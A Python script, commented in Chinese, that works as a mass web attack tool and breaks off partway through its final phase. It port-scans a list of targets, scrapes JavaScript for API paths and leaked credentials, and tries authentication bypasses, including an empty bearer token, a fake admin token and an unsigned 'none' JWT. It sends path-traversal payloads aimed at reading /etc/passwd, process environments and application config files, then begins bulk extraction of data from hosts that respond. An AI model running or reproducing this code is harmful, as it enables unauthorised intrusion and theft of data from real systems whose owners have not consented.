#!/usr/bin/env python3
"""
v6: 两阶段测试 + 路径拼接 + 文件读取探测 + API优先级评分
"""

import sys, os, re, json, time, ssl, socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

TCP_TIMEOUT = 1.5; HTTP_TIMEOUT = 8; API_TIMEOUT = 6
WORKERS = 40; API_TEST_WORKERS = 20

WEB_PORTS = [
    80,81,82,88,90,443,300,591,777,800,808,880,888,899,900,
    1080,1443,1935,2080,2095,2096,2443,2480,3000,3001,3020,3030,3040,
    3128,3333,3389,4000,4001,4040,4080,4433,4443,4444,4848,5000,5001,
    5050,5080,5432,5443,5555,5601,5800,5900,5984,6000,6001,6060,6080,
    6379,6543,6666,7000,7001,7070,7080,7100,7272,7443,7474,
    7547,7676,7777,7800,7890,7900,8000,8001,8002,8003,8008,
    8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,
    8100,8181,8200,8222,8300,8333,8383,8400,8443,8444,8484,
    8500,8530,8580,8800,8834,8848,8880,8888,8899,8900,8943,
    8983,9000,9001,9002,9009,9010,9020,9030,9040,9050,9060,
    9080,9081,9090,9091,9100,9110,9200,9292,9333,9393,
    9443,9444,9494,9500,9527,9595,9600,9666,9696,9800,
    9876,9898,9900,9988,9999,10000,10001,10010,10051,10080,10081,
    10082,10101,10200,10443,11000,11111,11211,11371,11501,12000,
    12121,12345,13000,13333,13555,13777,14000,14444,14500,15000,15555,
    16000,16010,16030,16379,17000,18000,18080,18081,18091,18181,
    19000,20000,20080,20256,21000,22000,22222,23000,23456,25000,
    27017,28000,28017,30000,32000,33333,35000,37777,40000,44444,50000,55555,60000,
]

INPUT = "/tmp/targets_filtered.txt"
OUTDIR = "/tmp/deep_scan_results"
os.makedirs(OUTDIR, exist_ok=True)

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

# ============= 从 Webpack_extract/Rules.js =============
LINKFINDER_RE = re.compile(
    r'''["'`](((?:[a-zA-Z]{1,10}://|//)[^"'/]{1,}\.[a-zA-Z]{2,}[^"']{0,})|'''
    r'''((?:/|\.\./|\./)[^"'><,;|*()(%%$^/\\\[\]][^"'><,;|()]{1,})|'''
    r'''([a-zA-Z0-9_\-/]{1,}/[a-zA-Z0-9_\-/]{1,}\.(?:[a-zA-Z]{1,4}|action)(?:[\?|#][^"|']{0,}|))|'''
    r'''([a-zA-Z0-9_\-/]{1,}/[a-zA-Z0-9_\-/]{3,}(?:[\?|#][^"|']{0,}|))|'''
    r'''([a-zA-Z0-9_\-]{1,}\.(?:\w)(?:[\?|#][^"|']{0,}|)))["'`]'''
)
WEBPACK_CHUNK_RE = re.compile(r'''\{[^{}]*\}\s*\[[^\]]*\]\s*\+\s*"[^"]*\.js"''')
ROUTER_PUSH_RE = re.compile(r'''\$router\.push\s*\(\s*["']([^"']+)["']''')

# SENSITIVE — 收紧: 只匹配明显的凭证/配置泄露
SENSITIVE_FIELD_RE = re.compile(
    r'''(?:secret|password|token|apiKey|accessKey|privateKey|jdbc|'
    r'Authorization|Bearer\s+[A-Za-z0-9._\-]{20,})'
    r'\s*[:=]\s*["']([^"']{8,200})["']''', re.I
)
INTERNAL_IP_RE = re.compile(r'''(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})''')
JDBC_RE = re.compile(r'''jdbc:[a-z:]+://[a-z0-9\.\-_:;=/@?,&]+''', re.I)

COMMON_LIBS = re.compile(
    r'(?:jquery|bootstrap|vue\.min|vue\.runtime|react\.min|react\.production|'
    r'angular\.min|axios\.min|lodash|moment|echarts|swiper|'
    r'polyfill|fontawesome|materialize|foundation|modernizr|'
    r'd3\.min|three\.min|popper|zepto|hammer|gsap|anime|'
    r'datatable|select2|cropper|sweetalert|tinymce|ckeditor|quill|summernote|'
    r'codemirror|ace-editor|monaco|crypto-js|socket\.io|'
    r'pdf\.js|jspdf|leaflet|mapbox|openlayers|fabric|'
    r'highlight|prism|markdown|marked|showdown|'
    r'velocity|waypoints|fullpage|wow|isotope|parallax|'
    r'slick|owl\.carousel|flickity|masonry|highcharts|raphael|'
    r'snap\.svg|webfont|scrollmagic|scrollreveal|particles|'
    r'vivus|lottie|bodymovin|aos|barba|cleave|dropzone|'
    r'nouislider|plyr|rellax|smooth-scroll|tippy|toastr|'
    r'clipboard|draggable|dragula|sortable|simplebar|autosize|'
    r'flatpickr|intl-tel-input|lazysizes|stickyfill|jarallax|'
    r'photoswipe|lightgallery|fancybox|magnific-popup|'
    r'filepond|uppy|shepherd|driver|intro\.js|tether|headroom|'
    r'chunk-vendors|chunk-common|vendor\.\w{8}\.|vendors\.\w{8}\.|'
    r'core-js|regenerator|webpack\.runtime|babel|polyfill|'
    r'dayjs|luxon|numeral|jszip|pdfmake|xlsx|docxtemplater|'
    r'trumbowyg|pell|trix|prosemirror|draft-js|slate|'
    r'blockly|konva|pixi|phaser|matter-js|box2d|'
    r'cannon|babylon|aframe|medium-editor|'
    r'h265web|ZLMRTC|missile)', re.I
)

def extract_apis(js_content):
    apis = set()
    for m in LINKFINDER_RE.finditer(js_content):
        path = m.group(0).strip('"\'`')
        if path.startswith(("http:", "https:", "//")): continue
        if not path.startswith("/"): path = "/" + path
        path = path.split("?")[0].split("#")[0].rstrip("/")
        if 2 < len(path) < 250:
            if os.path.splitext(path)[1].lower() not in (
                '.js','.css','.png','.jpg','.gif','.svg','.ico','.woff','.woff2','.ttf','.eot','.map','.json','.xml','.html','.pdf'):
                apis.add(path)
    for m in WEBPACK_CHUNK_RE.finditer(js_content):
        apis.add(m.group(0)[:200])
    for pat in [
        re.compile(r'''(?:url|path|baseURL)\s*:\s*["']([^"']{2,300})["']''', re.I),
        re.compile(r'''\.(?:get|post|put|delete|patch)\s*\(\s*["']([^"']{2,300})["']''', re.I),
        re.compile(r'''fetch\s*\(\s*["']([^"']{2,300})["']''', re.I),
        re.compile(r'''["'](/api/[a-zA-Z][a-zA-Z0-9_/\-.]{2,200})["']''', re.I),
    ]:
        for m in pat.finditer(js_content):
            path = m.group(1).strip()
            if not path or path.startswith(("http:", "https:", "//")): continue
            if not path.startswith("/"): path = "/" + path
            path = path.split("?")[0].rstrip("/")
            if 2 < len(path) < 250:
                if os.path.splitext(path)[1].lower() not in (
                    '.js','.css','.png','.jpg','.gif','.svg','.ico','.woff','.woff2','.ttf','.eot','.map','.json','.xml','.html','.pdf'):
                    apis.add(path)
    return apis

# ============= API 优先级评分 =============
def score_api(path):
    """评分越高越优先测试"""
    score = 0
    p = path.lower()
    # 凭证/管理类 → 最高优先
    if re.search(r'/(?:admin|user|account|auth|login|password|key|secret|token|config|system|server|manage)', p):
        score += 100
    # 数据类
    if re.search(r'/api/.+/(?:list|query|find|get|info|detail|search)', p):
        score += 70
    elif '/api/' in p:
        score += 50
    # 文件操作类 → 高优先 (文件读取漏洞)
    if re.search(r'/(?:download|file|upload|pdfview|preview|export|readfile|getfile|showfile|loadfile|openfile|filedown)', p):
        score += 90
    # Java/PHP端点
    if re.search(r'\.(?:action|do|php|jsp|aspx)\b', p):
        score += 60
    # 短路径 = 更可能是有用的
    if len(p.split('/')) <= 3:
        score += 20
    # Swagger/Druid
    if re.search(r'/(?:swagger|api-docs|druid|actuator)', p):
        score += 80
    return score

# ============= 路径拼接: 从URL目录结构扩展测试路径 =============
def expand_paths(base_url, apis):
    """根据目标URL的目录结构拼接API路径变体"""
    parsed = urlparse(base_url)
    path_parts = [p for p in parsed.path.strip('/').split('/') if p]

    # 提取目录前缀 (如 /app, /admin, /nsc)
    prefixes = set()
    for i in range(len(path_parts) + 1):
        prefix = '/' + '/'.join(path_parts[:i])
        if prefix != '/':
            prefixes.add(prefix)

    expanded = set(apis)
    for api in apis:
        if not api.startswith('/'): continue
        # 如果API是相对路径，拼接目录前缀
        for prefix in prefixes:
            expanded.add(prefix + api)
        # 也尝试去掉前缀
        for prefix in prefixes:
            if api.startswith(prefix):
                expanded.add(api[len(prefix):])

    return expanded

# ============= TCP / HTTP =============
def tcp_check(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TCP_TIMEOUT)
        r = s.connect_ex((str(host), int(port)))
        s.close()
        return r == 0
    except: return False

def http_get(url, timeout=HTTP_TIMEOUT, max_size=1_000_000):
    try:
        req = Request(url, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/javascript,application/json,*/*"
        })
        resp = urlopen(req, timeout=timeout, context=ssl_ctx)
        body = b""
        while True:
            try:
                chunk = resp.read(65536)
                if not chunk: break
                body += chunk
                if len(body) > max_size: break
            except: break
        return resp.getcode(), resp.url, body.decode('utf-8', errors='replace'), resp.headers.get("Content-Type", "")
    except HTTPError as e:
        try: return e.code, e.url, e.read().decode('utf-8', errors='replace')[:100000], ""
        except: return e.code, e.url, "", ""
    except: return None, None, "", ""

# ============= Phase 1: TCP =============
def phase1_probe(targets):
    print(f"[Phase 1] TCP: {len(targets)} targets, {len(WEB_PORTS)} ports layered, {WORKERS*5} workers")
    live, done = [], 0

    def probe_ip(host):
        for port in [80,443,8080,8443,8001]:
            if tcp_check(host, port):
                s = "https" if port in (443,8443) else "http"
                return {"url": f"{s}://{host}" if port in (80,443) else f"{s}://{host}:{port}"}
        for port in [81,82,88,3000,4000,5000,7000,8000,8002,8003,8008,8081,8088,8089,8888,9000,9090,9443,10000,10080]:
            if tcp_check(host, port):
                return {"url": f"http://{host}:{port}" if port not in (9443,) else f"https://{host}:{port}"}
        for port in [8444,9001,9002,9080,9091,9444,10443,18080,28080,5555]:
            if tcp_check(host, port):
                return {"url": f"http://{host}:{port}"}
        return None

    def probe_url(u):
        p = urlparse(u)
        port = p.port or (443 if p.scheme=="https" else 80)
        if tcp_check(p.hostname, port):
            return {"url": f"{p.scheme}://{p.hostname}" if port in (80,443) else f"{p.scheme}://{p.hostname}:{port}"}
        return None

    with ThreadPoolExecutor(max_workers=WORKERS*5) as pool:
        futures = {pool.submit(probe_url, t) if t.startswith("http") else pool.submit(probe_ip, t): t for t in targets}
        for f in as_completed(futures):
            done += 1
            if done % 2000 == 0: print(f"  [{done}/{len(targets)}] {len(live)} live")
            try:
                r = f.result()
                if r: live.append(r)
            except: pass
    print(f"  Phase 1 DONE: {len(live)} live")
    return live

# ============= Phase 2: 多页爬取 =============
def phase2_crawl(live_hosts):
    print(f"\n[Phase 2] 多页爬取+API提取: {len(live_hosts)} hosts")
    results, done = [], 0

    def process(h):
        url = h["url"] + "/"
        status, final_url, html, ct = http_get(url)
        if status is None or status >= 500 or not html or len(html) < 50: return None

        title = ""
        m = re.search(r'<title[^>]*>([^<]+)</title>', html, re.I)
        if m: title = m.group(1).strip()[:200]

        parsed = urlparse(final_url)
        base = f"{parsed.scheme}://{parsed.hostname}"
        if parsed.port and parsed.port not in (80,443): base += f":{parsed.port}"

        # 提取链接
        links = set()
        for m in re.finditer(r'''href\s*=\s*["']([^"']{1,200})["']''', html, re.I):
            href = m.group(1)
            if href.startswith("#") or href.startswith("javascript:"): continue
            if not href.startswith("http"): href = urljoin(base, href)
            if urlparse(href).hostname == parsed.hostname:
                if not re.search(r'\.(?:js|css|png|jpg|gif|svg|ico|pdf|doc|zip)(?:\?|$)', href):
                    links.add(href)

        # 提取JS
        js_urls = set()
        for m in re.finditer(r'<script[^>]+src\s*=\s*["\x27]?([^"\'<>\s]+\.js[^"\'<>\s]*)["\x27]?', html, re.I):
            src = m.group(1)
            js_urls.add(urljoin(base, src) if not src.startswith("http") else src)

        for pat in [WEBPACK_CHUNK_RE,
                     re.compile(r'''["']([^"']*?(?:static/js|js)/[^"']+\.js)["']''')]:
            for m in pat.finditer(html):
                chunk = str(m.group(0)).strip('"\'')
                if "/js/" in chunk: js_urls.add(urljoin(base, chunk))

        inline_scripts = re.findall(r'<script[^>]*>([\s\S]*?)</script>', html, re.I)
        all_apis = set()
        for s in inline_scripts:
            if s.strip(): all_apis.update(extract_apis(s))

        # 下载JS提取API
        app_js = [j for j in js_urls if not COMMON_LIBS.search(j)]
        for js_url in list(app_js)[:25]:
            s, _, content, _ = http_get(js_url, max_size=500_000)
            if s != 200 or not content: continue
            all_apis.update(extract_apis(content))
            for m in SENSITIVE_FIELD_RE.finditer(content):
                all_apis.add(f"SENSITIVE:{m.group(1)[:100]}")
            for m in INTERNAL_IP_RE.finditer(content):
                all_apis.add(f"INTERNAL_IP:{m.group(0)}")
            for m in JDBC_RE.finditer(content):
                all_apis.add(f"JDBC:{m.group(0)}")

        # 多页爬取
        crawled_pages = set()
        for link in list(links)[:10]:
            if link in crawled_pages: continue
            crawled_pages.add(link)
            s, _, page_html, _ = http_get(link)
            if s != 200 or not page_html or len(page_html) < 100: continue
            for m in re.finditer(r'<script[^>]+src\s*=\s*["\x27]?([^"\'<>\s]+\.js[^"\'<>\s]*)["\x27]?', page_html, re.I):
                src = m.group(1)
                js_urls.add(urljoin(base, src) if not src.startswith("http") else src)
            sub_scripts = re.findall(r'<script[^>]*>([\s\S]*?)</script>', page_html, re.I)
            for s in sub_scripts:
                if s.strip(): all_apis.update(extract_apis(s))

        # 下载新发现的JS
        new_js = [j for j in js_urls if j not in app_js and not COMMON_LIBS.search(j)]
        for js_url in list(new_js)[:10]:
            s, _, content, _ = http_get(js_url, max_size=300_000)
            if s != 200 or not content: continue
            all_apis.update(extract_apis(content))

        # 路径拼接扩展
        all_apis = expand_paths(base, all_apis)

        # 通用敏感路径
        all_apis.update([
            "/api/user/users","/api/user/list","/api/user/info","/api/user/userInfo",
            "/api/server/info","/api/server/system/info","/api/server/system/configInfo",
            "/api/server/media_server/list","/api/role/all","/api/log/list",
            "/api/device/query/devices","/api/common/channel/list",
            "/api/userApiKey/userApiKeys",
            "/actuator","/actuator/health","/actuator/env","/actuator/mappings",
            "/swagger-resources","/v2/api-docs","/v3/api-docs","/swagger-ui.html",
            "/druid/index.html",
        ])

        clean_apis = sorted(a for a in all_apis if not a.startswith(("SENSITIVE:","INTERNAL_IP:","JDBC:")))
        sensitive_info = [a for a in all_apis if a.startswith(("SENSITIVE:","INTERNAL_IP:","JDBC:"))]

        if not clean_apis and not sensitive_info: return None

        # API 优先级排序
        scored_apis = sorted(clean_apis, key=lambda x: -score_api(x))

        return {
            "base": base, "title": title, "status": status,
            "apis": scored_apis,  # 已排序，高优先在前
            "sensitive_info": sensitive_info,
            "js_count": len(app_js), "pages_crawled": len(crawled_pages),
        }

    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = {pool.submit(process, h): h for h in live_hosts}
        for f in as_completed(futures):
            done += 1
            if done % 100 == 0: print(f"  [{done}/{len(live_hosts)}] {len(results)} with APIs")
            try:
                r = f.result()
                if r: results.append(r)
            except: pass
    print(f"  Phase 2 DONE: {len(results)} hosts with APIs")
    return results

# ============= Phase 3: 两阶段智能测试 =============
QUERY_SUFFIXES = [
    ("", None), ("?page=1&count=10", None), ("?page=1&size=10", None),
]

# 快速筛选: 只用最有效的2种绕过
FAST_BYPASS = [
    ("GET_no_auth", "GET", None, None, {}),
    ("POST_JSON_no_auth", "POST", "application/json", lambda p: json.dumps(p), {}),
]

# 深度测试: 全部6种绕过
FULL_BYPASS = [
    ("GET_no_auth", "GET", None, None, {}),
    ("GET_empty_bearer", "GET", None, None, {"Authorization": "Bearer "}),
    ("GET_admin_token", "GET", None, None, {"Authorization": "Bearer admin-token"}),
    ("POST_JSON_no_auth", "POST", "application/json", lambda p: json.dumps(p), {}),
    ("POST_FORM_no_auth", "POST", "application/x-www-form-urlencoded", lambda p: "&".join(f"{k}={v}" for k,v in p.items()).encode(), {}),
    ("POST_JSON_JWT_none", "POST", "application/json", lambda p: json.dumps(p), {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."}),
]

# 文件读取测试路径
FILE_READ_PAYLOADS = [
    ("/etc/passwd", "linux_passwd"),
    ("/windows/win.ini", "windows_ini"),
    ("C:\\windows\\win.ini", "windows_ini2"),
    ("../../../etc/passwd", "path_traversal"),
    ("..\\..\\..\\windows\\win.ini", "path_traversal2"),
    ("/proc/self/environ", "proc_environ"),
    ("file:///etc/passwd", "file_proto"),
    ("../../WEB-INF/web.xml", "webxml"),
    ("../../application.properties", "app_props"),
]

FILE_READ_ENDPOINTS = [
    "/download", "/file/download", "/file/read", "/common/download",
    "/api/file/download", "/api/download", "/api/file/read",
    "/preview", "/pdfview", "/export", "/api/export",
    "/readFile", "/getFile", "/showFile", "/loadFile", "/openFile",
    "/api/file/get", "/api/file/preview",
    "/filedown", "/down", "/dl", "/attach/download",
    "/upload", "/api/upload",  # 有时upload也能读
]

AUTH_FAIL_MSGS = [
    "缺少请求授权令牌","token无效","token过期","未登录","请登录","请先登录",
    "登录已过期","重新登录","认证失败","鉴权失败",
    "Unauthorized","unauthenticated","Authentication required",
    "Full authentication","Access Denied","Forbidden",
]

PARAM_GUESS = {
    "user":["username","userId","id","page","size","count","roleId"],
    "list":["page","size","count","pageNum","pageSize","limit","offset"],
    "login":["username","password","code","token","captcha","verKey"],
    "config":["key","type","id","name"],
    "device":["deviceId","id","page","size","count","online"],
    "channel":["channelId","id","page","size","count","online","channelType"],
    "server":["serverId","id","type"],
    "log":["page","size","type","date","level","fileName"],
    "info":["id","userId"],
    "query":["id","keyword","page","size"],
    "search":["keyword","query","page","size"],
    "find":["id","keyword","page","size"],
    "update":["id","userId","data"],
    "delete":["id","ids"],
    "add":["name","type","status","parentId","data"],
    "password":["oldPassword","newPassword","password","userId","id"],
    "download":["file","path","filename","filePath","name","id"],
    "file":["file","path","filename","filePath","name","id","type"],
    "preview":["file","path","filename","id"],
    "export":["file","type","id","name"],
}

def guess_params(path):
    params = {}
    for key, guesses in PARAM_GUESS.items():
        if key in path.lower():
            for g in guesses:
                if g not in params:
                    params[g] = 1 if g.endswith("Id") or g in ("id","page","size","count","limit","offset") else "test"
    if "page" not in params: params["page"] = 1; params["size"] = 10
    return params

def is_auth_fail(parsed):
    if not isinstance(parsed, dict): return False
    code = str(parsed.get("code","") or parsed.get("statusCode","") or parsed.get("status",""))
    msg = str(parsed.get("msg","") or parsed.get("message","") or parsed.get("errorMessage",""))
    if code in ("10031","401","403","500002","40001","4010"): return True
    return any(p in msg for p in AUTH_FAIL_MSGS)

def make_request(url, method, content_type, body_data, headers_extra):
    """统一请求函数"""
    headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json, text/html, */*"}
    headers.update(headers_extra)
    data = None
    if body_data is not None:
        if isinstance(body_data, str): data = body_data.encode()
        elif isinstance(body_data, bytes): data = body_data
        elif callable(body_data): data = body_data({})
        if data and content_type: headers["Content-Type"] = content_type
    req = Request(url, data=data, headers=headers, method=method)
    resp = urlopen(req, timeout=API_TIMEOUT, context=ssl_ctx)
    return resp.getcode(), resp.read().decode('utf-8', errors='replace')

def check_response(resp_body, url, method, test_name, desc):
    """检查响应是否表示未授权访问"""
    if len(resp_body) < 20: return None
    parsed = None
    try: parsed = json.loads(resp_body)
    except: pass

    if parsed and isinstance(parsed, dict):
        if is_auth_fail(parsed): return None
        code_val = str(parsed.get("code","") or parsed.get("statusCode","") or parsed.get("status",""))
        msg = str(parsed.get("msg","") or parsed.get("message",""))
        d = parsed.get("data")
        has_data = (
            (isinstance(d, list) and len(d)>0) or
            (isinstance(d, dict) and d and set(d.keys())-{"path","time","timestamp","error","status"}) or
            (isinstance(d, str) and d not in ("null","","[]")) or
            bool(parsed.get("records")) or bool(parsed.get("list")) or bool(parsed.get("items"))
        )
        if has_data or code_val in ("0","200","20000","000000"):
            f = {"url":url,"method":method,"test":test_name,"desc":desc,"status":200,"code":code_val,"msg":msg[:200]}
            if isinstance(d, list): f["data_count"] = len(d); f["data_preview"] = json.dumps(d[:3],ensure_ascii=False)[:500]
            elif isinstance(d, dict): f["data_keys"] = list(d.keys())[:20]
            elif isinstance(d, str) and d not in ("null",""): f["data_value"] = d[:200]
            rl = resp_body.lower()
            if any(kw in rl for kw in ["secret","password","token","apikey","jdbc"]):
                f["credential_leak"] = True; f["raw"] = resp_body[:2000]
            else: f["raw"] = resp_body[:1000]
            return f

    elif parsed and isinstance(parsed, list) and len(parsed) > 0:
        return {"url":url,"method":method,"test":test_name,"desc":desc,"status":200,"data_count":len(parsed),
                "data_preview":json.dumps(parsed[:3],ensure_ascii=False)[:500],"raw":resp_body[:1500]}

    elif "<html" not in resp_body[:100].lower() and len(resp_body) < 500 and len(resp_body) > 20:
        # 纯文本响应(可能是AES key/token等)
        return {"url":url,"method":method,"test":test_name,"desc":desc,"status":200,"data_value":resp_body[:200],"raw":resp_body[:1000]}

    return None

def test_file_read(base_url):
    """测试文件读取/下载漏洞"""
    findings = []
    for endpoint in FILE_READ_ENDPOINTS:
        for payload, payload_name in FILE_READ_PAYLOADS:
            url = urljoin(base_url, endpoint)
            # 尝试 GET 带参数
            for param_name in ["file","path","filename","filePath","name"]:
                try:
                    test_url = f"{url}?{param_name}={payload}"
                    code, body = make_request(test_url, "GET", None, None, {})
                    if code != 200 or len(body) < 20: continue
                    # 检查是否读到了真实文件内容
                    if any(marker in body[:500] for marker in ["root:", "daemon:", "[extensions]", "for 16-bit app",
                          "WEB-INF", "application.properties", "PATH=", "USER=","[fonts]","[mci extensions]"]):
                        findings.append({
                            "url": test_url, "method": "GET", "test": "file_read", "desc": f"FILE READ: {payload_name}",
                            "status": code, "data_value": body[:500], "raw": body[:1500]
                        })
                        return findings  # 找到一个就够
                except: pass

            # 尝试 POST
            try:
                for param_name in ["file","path","filename","filePath","name"]:
                    data = json.dumps({param_name: payload})
                    code, body = make_request(url, "POST", "application/json", data, {})
                    if code == 200 and len(body) > 20:
                        if any(marker in body[:500] for marker in ["root:", "daemon:", "[extensions]","WEB-INF"]):
                            findings.append({
                                "url": url, "method": "POST", "test": "file_read", "desc": f"FILE READ (POST): {payload_name}",
                                "status": code, "data_value": body[:500], "raw": body[:1500]
                            })
                            return findings
            except: pass

    return findings

def test_one_api(base_url, path, bypass_tests):
    """测试单个API端点"""
    clean = path.split("?")[0].rstrip("/")
    if not clean or clean.startswith(("SENSITIVE:","INTERNAL_IP:","JDBC:")): return []
    url_base = urljoin(base_url, clean)
    params = guess_params(clean)
    findings = []

    for qs, qs_params in QUERY_SUFFIXES:
        url = url_base + qs
        test_params = dict(params)
        if qs_params: test_params.update(qs_params)

        for name, method, ct, body_factory, headers in bypass_tests:
            try:
                data = None
                if method in ("POST","PUT","PATCH") and body_factory:
                    data = body_factory(test_params)
                code, body = make_request(url, method, ct, data, headers)
                f = check_response(body, url, method, name, name)
                if f: findings.append(f); return findings
            except HTTPError as e:
                if e.code not in (404,403,405,400,500):
                    try:
                        b = e.read().decode('utf-8', errors='replace')
                        f = check_response(b, url, method, name, name)
                        if f: findings.append(f)
                    except: pass
            except: pass
    return findings

def phase3_test(api_targets, live_hosts):
    print(f"\n[Phase 3] 两阶段智能测试: {len(api_targets)} API hosts + {len(live_hosts)} live (baseline)")

    # === Phase 3a: 快速筛选 ===
    print(f"  [3a] 快速筛选: TOP30高优先API × 2种绕过")

    # 融入 ALL live hosts (不仅是api_targets) 测试基准敏感路径
    # 这是 v4 成功的关键 — 很多漏洞在不含JS的后端API上
    baseline_paths = [
        "/api/user/users","/api/user/list","/api/user/info","/api/user/userInfo",
        "/api/server/info","/api/server/system/info","/api/server/system/configInfo",
        "/api/server/media_server/list","/api/role/all","/api/log/list",
        "/api/device/query/devices","/api/common/channel/list",
        "/api/userApiKey/userApiKeys",
        "/actuator","/actuator/health","/actuator/env",
        "/swagger-resources","/v2/api-docs","/v3/api-docs","/swagger-ui.html",
        "/druid/index.html",
        "/general/login_code_check.php","/logincheck_code.php",
        "/prod-api","/api","/api/about","/api/tags/all","/api/articles/all",
        "/e/port/tongji.php","/api/nsc/user/users",
    ]
    candidates = []
    done = 0

    # 扁平化: 每个 (target, api_path) 一个单独任务，单层线程池
    # 构建任务列表: API目标(TOP30) + 所有存活主机(基准路径)
    flat_tasks = []
    target_map = {}
    for t in api_targets:
        target_map[t["base"]] = t
        t["_findings"] = []
        for api in t["apis"][:30]:
            flat_tasks.append((t, api))

    # 为所有存活主机(含无API的)创建基准路径测试
    # 为没有api_target的主机创建轻量条目
    api_bases = {t["base"] for t in api_targets}
    for h in live_hosts:
        base = h["url"]
        if base not in target_map:
            lt = {"base": base, "title": "", "apis": [], "_findings": [], "sensitive_info": [], "js_count": 0, "pages_crawled": 0}
            target_map[base] = lt
    for base, t in target_map.items():
        for bp in baseline_paths:
            flat_tasks.append((t, bp))

    print(f"    扁平任务: {len(flat_tasks)} (APIs + baseline on {len(target_map)} hosts)")

    def test_flat(task):
        t, api = task
        return (t["base"], test_one_api(t["base"], api, FAST_BYPASS))

    with ThreadPoolExecutor(max_workers=100) as pool:
        futures = {pool.submit(test_flat, task): task for task in flat_tasks}
        for f in as_completed(futures):
            done += 1
            if done % 5000 == 0:
                print(f"    [{done}/{len(flat_tasks)}] APIs tested")
            try:
                base_url, findings = f.result()
                if findings:
                    target_map[base_url]["_findings"].extend(findings)
            except: pass

    # 收集结果(遍历全部target_map,含轻量条目)
    print(f"    收集候选(共{len(target_map)}个主机)...")
    for i, (base, t) in enumerate(target_map.items()):
        if i % 500 == 0: print(f"      [{i}/{len(target_map)}]")
        api_findings = [f for f in t.get("_findings", []) if f.get("test") not in ("sensitive_info",)]
        sensitive = [f for f in t.get("_findings", []) if f.get("test") == "sensitive_info"]
        for si in t.get("sensitive_info", []):
            sensitive.append({"url":t["base"],"method":"INFO","test":"sensitive_info","desc":si,"status":0,"data_value":si})
        if api_findings:
            t["findings_3a"] = api_findings + sensitive
            candidates.append(t)
        t.pop("_findings", None)

    print(f"  [3a] DONE: {len(candidates)} candidates for deep test")

    # === Phase 3b: 深度测试 (仅候选) ===
    if not candidates:
        print(f"  [3b] SKIP: no candidates")
        return []

    print(f"  [3b] 深度测试: {len(candidates)} targets × ALL APIs × 6 bypass")
    vulnerable = []
    done = 0

    # 构建扁平任务
    deep_tasks = []
    cand_map = {}
    for t in candidates:
        cand_map[t["base"]] = t
        t["_deep_findings"] = list(t.get("findings_3a", []))
        apis = t.get("apis", [])
        for api in (apis[:60] if apis else baseline_paths):  # TOP60 or baseline
            deep_tasks.append((t, api))

    print(f"    扁平任务: {len(deep_tasks)} 个")

    def test_deep_flat(task):
        t, api = task
        return (t["base"], test_one_api(t["base"], api, FULL_BYPASS))

    with ThreadPoolExecutor(max_workers=80) as pool:
        futures = {pool.submit(test_deep_flat, task): task for task in deep_tasks}
        for f in as_completed(futures):
            done += 1
            if done % 3000 == 0:
                print(f"    [{done}/{len(deep_tasks)}] deep APIs")
            try:
                base_url, findings = f.result()
                if findings:
                    cand_map[base_url]["_deep_findings"].extend(findings)
            except: pass

    # 文件读取扁平测试(仅候选,并行)
    file_tasks = []
    for t in candidates:
        for ep in FILE_READ_ENDPOINTS[:5]:  # 只测5个下载端点
            for payload, pname in FILE_READ_PAYLOADS[:5]:  # 只测5种payload
                file_tasks.append((t, ep, payload, pname))
    print(f"    文件读取任务: {len(file_tasks)}")

    def test_file_flat(task):
        t, ep, payload, pname = task
        url = urljoin(t["base"], ep)
        findings = []
        for param in ["file", "path", "filename"]:
            try:
                test_url = f"{url}?{param}={payload}"
                req = Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                resp = urlopen(req, timeout=API_TIMEOUT, context=ssl_ctx)
                body = resp.read().decode('utf-8', errors='replace')
                if any(m in body[:500] for m in ["root:", "daemon:", "[extensions]", "WEB-INF", "application.properties", "PATH=", "USER="]):
                    return (t["base"], [{"url": test_url, "method": "GET", "test": "file_read", "desc": f"FILE READ: {pname}", "status": 200, "data_value": body[:500]}])
            except: pass
        return (t["base"], [])

    with ThreadPoolExecutor(max_workers=30) as pool:
        futures = {pool.submit(test_file_flat, ft): ft for ft in file_tasks}
        for f in as_completed(futures):
            try:
                base_url, findings = f.result()
                if findings:
                    cand_map[base_url]["_deep_findings"].extend(findings)
            except: pass

    for t in candidates:
        all_f = t.get("_deep_findings", [])
        if all_f:
            seen = set()
            unique = []
            for fi in all_f:
                key = fi["url"] + fi.get("test","")
                if key not in seen:
                    seen.add(key)
                    unique.append(fi)
            t["findings"] = unique
            t["finding_count"] = len(unique)
            fname = re.sub(r'[^a-zA-Z0-9]', '_', t["base"]) + ".json"
            with open(os.path.join(OUTDIR, fname), "w") as f:
                json.dump(t, f, ensure_ascii=False, indent=2, default=str)
            vulnerable.append(t)
            print(f"\n  [!] {t['base']} | {t['title'][:60]}")
            for fi in t["findings"][:5]:
                print(f"      [{fi.get('method','')}] {fi.get('url','')[:80]}")
                for k in ["data_count","data_keys","data_value","credential_leak"]:
                    if k in fi: print(f"        {k}: {str(fi[k])[:120]}")
        t.pop("_deep_findings", None)

    print(f"  Phase 3 DONE: {len(vulnerable)} vulnerable")
    return vulnerable

# ============= Phase 4+5 =============
def phase4_deep(vulnerable):
    if not vulnerable: return
    print(f"\n[Phase 4] 深度利用: {len(vulnerable)} targets")
    for v in vulnerable:
        for fi in v.get("findings", [])[:3]:
            base_path = fi["url"].split("?")[0].rstrip("/")
            for ext in ["?page=1&size=1000", "/all", ""]:
                try:
                    req = Request(base_path+ext, headers={"User-Agent":"Mozilla/5.0","Accept":"application/json"})
                    resp = urlopen(req, timeout=8, context=ssl_ctx)
                    body = resp.read().decode('utf-8', errors='replace')
                    parsed = json.loads(body)
                    d = parsed.get("data")
